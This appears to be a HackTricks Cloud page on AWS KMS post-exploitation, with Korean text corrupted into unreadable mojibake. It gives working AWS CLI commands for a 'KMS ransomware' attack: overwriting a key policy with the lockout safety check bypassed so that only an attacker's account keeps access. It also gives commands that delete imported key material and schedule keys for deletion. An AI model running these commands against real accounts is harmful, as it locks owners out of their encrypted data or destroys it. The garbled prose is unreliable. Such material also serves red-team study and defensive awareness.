# AWS - KMS Post Exploitation

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## KMS

ìì„¸í•œ ì •ë³´ëŠ” ë‹¤ìŒì„ í™•ì¸í•˜ì„¸ìš”:

{% content-ref url="../../aws-security/aws-services/aws-kms-enum.md" %}
[aws-kms-enum.md](../../aws-security/aws-services/aws-kms-enum.md)
{% endcontent-ref %}

### ì •ë³´ ì•”í˜¸í™”/ë³µí˜¸í™”

* **ëŒ€ì¹­** í‚¤ë¥¼ ì‚¬ìš©
```bash
# Encrypt data
aws kms encrypt \
--key-id f0d3d719-b054-49ec-b515-4095b4777049 \
--plaintext fileb:///tmp/hello.txt \
--output text \
--query CiphertextBlob | base64 \
--decode > ExampleEncryptedFile

# Decrypt data
aws kms decrypt \
--ciphertext-blob fileb://ExampleEncryptedFile \
--key-id f0d3d719-b054-49ec-b515-4095b4777049 \
--output text \
--query Plaintext | base64 \
--decode
```
* **ë¹„ëŒ€ì¹­** í‚¤ ì‚¬ìš©:
```bash
# Encrypt data
aws kms encrypt \
--key-id d6fecf9d-7aeb-4cd4-bdd3-9044f3f6035a \
--encryption-algorithm RSAES_OAEP_SHA_256 \
--plaintext fileb:///tmp/hello.txt \
--output text \
--query CiphertextBlob | base64 \
--decode > ExampleEncryptedFile

# Decrypt data
aws kms decrypt \
--ciphertext-blob fileb://ExampleEncryptedFile \
--encryption-algorithm RSAES_OAEP_SHA_256 \
--key-id d6fecf9d-7aeb-4cd4-bdd3-9044f3f6035a \
--output text \
--query Plaintext | base64 \
--decode
```
{% hint style="warning" %}
kms decrypt ì‘ì—…ì„ ì‹œë„í•  ë•Œ 'An error occurred (InvalidCiphertextException) when calling the Decrypt operation:' ì˜¤ë¥˜ê°€ ë°œìƒí•˜ë©´ **`fileb://`** ëŒ€ì‹  **`--ciphertext-blob file://`**ì„ ì‚¬ìš©í•´ ë³´ì‹­ì‹œì˜¤.

**`file://`**ì˜ ì‚¬ìš©ì€ CLIë¥¼ ì‚¬ìš©í•  ë•Œ ì„ í˜¸í•˜ëŠ” ì¸ì½”ë”©ìœ¼ë¡œ ì‘ì„±ëœ íŒŒì¼ì„ ì‚¬ìš©í•  ìˆ˜ ìˆëŠ” í¸ë¦¬í•¨ì„ ì œê³µí•©ë‹ˆë‹¤.
CLI ë²„ì „ 1.6.3 ì´ìƒì—ì„œëŠ” íŒŒì¼ì˜ ë‚´ìš©ì„ CLIì— ì „ë‹¬í•˜ëŠ” ë˜ ë‹¤ë¥¸ ë°©ë²•ì¸ **`fileb://`**ì„ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ëŠ” **`file://`**ê³¼ ìœ ì‚¬í•˜ê²Œ ì‘ë™í•˜ì§€ë§Œ, íŒŒì¼ì˜ ë‚´ìš©ì„ í…ìŠ¤íŠ¸ë¡œ ì½ëŠ” ëŒ€ì‹  ë°”ì´ë„ˆë¦¬ë¡œ ì½ìŠµë‹ˆë‹¤.

ëŒ€ë¶€ë¶„ì˜ ê²½ìš°, **`file://`**ì€ íŒŒì¼ì˜ ë‚´ìš©ì„ ì…ë ¥ìœ¼ë¡œ ì „ë‹¬í•˜ëŠ” ì‚¬ìš© ì‚¬ë¡€ë¥¼ ì¶©ì¡±ì‹œí‚¬ ê²ƒì…ë‹ˆë‹¤. ê·¸ëŸ¬ë‚˜ íŒŒì¼ì˜ ë‚´ìš©ì„ í…ìŠ¤íŠ¸ê°€ ì•„ë‹Œ ë°”ì´ë„ˆë¦¬ë¡œ ì „ë‹¬í•´ì•¼ í•˜ëŠ” ê²½ìš° **`fileb://`**ì„ ì‚¬ìš©í•´ì•¼ í•˜ëŠ” ê²½ìš°ë„ ìˆìŠµë‹ˆë‹¤.
AWSì˜ ìì„¸í•œ ë‚´ìš©ì€ ì—¬ê¸°ì—ì„œ í™•ì¸í•˜ì‹­ì‹œì˜¤: [AWS Blog - Best Practice for Local File Parameters](https://aws.amazon.com/blogs/developer/best-practices-for-local-file-parameters/)
{% endhint %}

### KMS ëœì„¬ì›¨ì–´

KMSì— ëŒ€í•œ íŠ¹ê¶Œ ì ‘ê·¼ ê¶Œí•œì„ ê°€ì§„ ê³µê²©ìëŠ” í‚¤ì˜ KMS ì •ì±…ì„ ìˆ˜ì •í•˜ê³  **ìì‹ ì˜ ê³„ì •ì— ëŒ€í•œ ì ‘ê·¼ ê¶Œí•œì„ ë¶€ì—¬**í•˜ì—¬ í•©ë²•ì ì¸ ê³„ì •ì— ë¶€ì—¬ëœ ì ‘ê·¼ ê¶Œí•œì„ ì œê±°í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ê·¸ëŸ¬ë©´ í•©ë²•ì ì¸ ê³„ì • ì‚¬ìš©ìëŠ” í•´ë‹¹ í‚¤ë¡œ ì•”í˜¸í™”ëœ ëª¨ë“  ì„œë¹„ìŠ¤ì˜ ì •ë³´ë¥¼ ì•¡ì„¸ìŠ¤í•  ìˆ˜ ì—†ê²Œ ë˜ì–´ ê³„ì •ì— ëŒ€í•œ ê°„ë‹¨í•˜ì§€ë§Œ íš¨ê³¼ì ì¸ ëœì„¬ì›¨ì–´ë¥¼ ìƒì„±í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

{% hint style="warning" %}
**AWS ê´€ë¦¬ í‚¤ëŠ” ì´ ê³µê²©ì— ì˜í–¥ì„ ë°›ì§€ ì•Šìœ¼ë©°**, **ê³ ê° ê´€ë¦¬ í‚¤**ë§Œ ì˜í–¥ì„ ë°›ëŠ”ë‹¤ëŠ” ì ì— ìœ ì˜í•˜ì‹­ì‹œì˜¤.

ë˜í•œ **`--bypass-policy-lockout-safety-check`** ë§¤ê°œë³€ìˆ˜ë¥¼ ì‚¬ìš©í•´ì•¼ í•œë‹¤ëŠ” ì ì— ìœ ì˜í•˜ì‹­ì‹œì˜¤ (ì›¹ ì½˜ì†”ì—ì„œ ì´ ì˜µì…˜ì´ ì—†ê¸° ë•Œë¬¸ì— ì´ ê³µê²©ì€ CLIì—ì„œë§Œ ê°€ëŠ¥í•©ë‹ˆë‹¤).
{% endhint %}
```bash
# Force policy change
aws kms put-key-policy --key-id mrk-c10357313a644d69b4b28b88523ef20c \
--policy-name default \
--policy file:///tmp/policy.yaml \
--bypass-policy-lockout-safety-check

{
"Id": "key-consolepolicy-3",
"Version": "2012-10-17",
"Statement": [
{
"Sid": "Enable IAM User Permissions",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::<your_own_account>:root"
},
"Action": "kms:*",
"Resource": "*"
}
]
}
```
{% hint style="danger" %}
í•´ë‹¹ ì •ì±…ì„ ë³€ê²½í•˜ì—¬ ì™¸ë¶€ ê³„ì •ì—ë§Œ ì ‘ê·¼ ê¶Œí•œì„ ë¶€ì—¬í•œ í›„, ì´ ì™¸ë¶€ ê³„ì •ì—ì„œ ìƒˆë¡œìš´ ì •ì±…ì„ ì„¤ì •í•˜ì—¬ **ì›ë˜ ê³„ì •ì— ì ‘ê·¼ ê¶Œí•œì„ ë‹¤ì‹œ ë¶€ì—¬í•˜ë ¤ê³  í•˜ë©´, ë¶ˆê°€ëŠ¥**í•©ë‹ˆë‹¤.
{% endhint %}

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Generic KMS Ransomware

#### Global KMS Ransomware

Global KMS Ransomwareë¥¼ ìˆ˜í–‰í•˜ëŠ” ë˜ ë‹¤ë¥¸ ë°©ë²•ì€ ë‹¤ìŒ ë‹¨ê³„ë¥¼ í¬í•¨í•©ë‹ˆë‹¤:

* ê³µê²©ìê°€ ê°€ì ¸ì˜¨ **í‚¤ ì¬ë£Œë¡œ ìƒˆë¡œìš´ í‚¤ ìƒì„±**
* ì´ì „ ë²„ì „ìœ¼ë¡œ ì•”í˜¸í™”ëœ **ê¸°ì¡´ ë°ì´í„°ë¥¼ ìƒˆë¡œìš´ í‚¤ë¡œ ì¬ì•”í˜¸í™”**
* **KMS í‚¤ ì‚­ì œ**
* ì´ì œ ì›ë˜ í‚¤ ì¬ë£Œë¥¼ ê°€ì§„ ê³µê²©ìë§Œ ì•”í˜¸í™”ëœ ë°ì´í„°ë¥¼ ë³µí˜¸í™”í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤

### Destroy keys
```bash
# Destoy they key material previously imported making the key useless
aws kms delete-imported-key-material --key-id 1234abcd-12ab-34cd-56ef-1234567890ab

# Schedule the destoy of a key (min wait time is 7 days)
aws kms schedule-key-deletion \
--key-id arn:aws:kms:us-west-2:123456789012:key/1234abcd-12ab-34cd-56ef-1234567890ab \
--pending-window-in-days 7
```
{% hint style="danger" %}
AWSëŠ” ì´ì œ **êµì°¨ ê³„ì •ì—ì„œ ì´ì „ ì‘ì—…ì´ ìˆ˜í–‰ë˜ëŠ” ê²ƒì„ ë°©ì§€í•©ë‹ˆë‹¤:**
{% endhint %}

<figure><img src="../../../.gitbook/assets/image (17).png" alt=""><figcaption></figcaption></figure>

{% hint style="success" %}
AWS Hacking í•™ìŠµ ë° ì—°ìŠµ:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCP Hacking í•™ìŠµ ë° ì—°ìŠµ: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks ì§€ì›</summary>

* [**êµ¬ë… í”Œëœ**](https://github.com/sponsors/carlospolop)ì„ í™•ì¸í•˜ì„¸ìš”!
* ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**telegram ê·¸ë£¹**](https://t.me/peass)ì— ê°€ì…í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)ì„ íŒ”ë¡œìš°í•˜ì„¸ìš”.
* PRì„ ì œì¶œí•˜ì—¬ [**HackTricks**](https://github.com/carlospolop/hacktricks) ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ì €ì¥ì†Œì— í•´í‚¹ íŠ¸ë¦­ì„ ê³µìœ í•˜ì„¸ìš”.

</details>
{% endhint %}
